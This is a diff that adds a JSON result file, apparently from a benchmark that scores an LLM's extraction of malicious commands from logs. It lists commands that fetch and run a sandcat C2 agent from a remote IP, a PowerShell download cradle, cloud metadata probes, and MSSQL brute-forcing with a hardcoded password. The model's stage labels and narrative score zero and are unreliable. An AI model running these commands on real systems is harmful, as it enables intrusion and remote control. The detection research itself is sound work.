@@ -1,0 +1,103 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "sh -c 'echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC-ljIDEgMTAuN6QuMjAxOSAyMDA='",
+        "stage": "Execution"
+      },
+      {
+        "command": "wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header='Metadata:true' -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "curl --connect-timeout 7 -s --header='Metadata:true' http://169.254.169.254/metadata/instance?api-version=2019-03-11",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q -O - http://169.254.169.254/latest/meta-data/instance-id",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "curl --connect-timeout 7 -s  http://169.254.169.254/latest/meta-data/instance-id",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sh -c /usr/local/hostguard/bin/curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "python -m SimpleHTTPServer 8079",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 ...'",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "$ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output)",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 ...",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attackers initially gain access to the system through multiple methods, including metadata services and custom scripts. They proceed to download and execute a payload ('sandcat LINUX') and establish command and control capabilities. The attackers also attempt to collect information via SQL injection and use PowerShell and Python for persistence and privilege escalation.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 32492,
+      "completion_tokens": 3946,
+      "total_tokens": 36438,
+      "wall_clock_s": 45.602,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.38461538461538464,
+      "recall": 0.5555555555555556,
+      "f1": 0.4545454545454546,
+      "tp": 5,
+      "fp": 8,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 13,
+      "fn": 7,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 32492,
+      "completion_tokens": 3946,
+      "total_tokens": 36438,
+      "wall_clock_s": 45.602,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
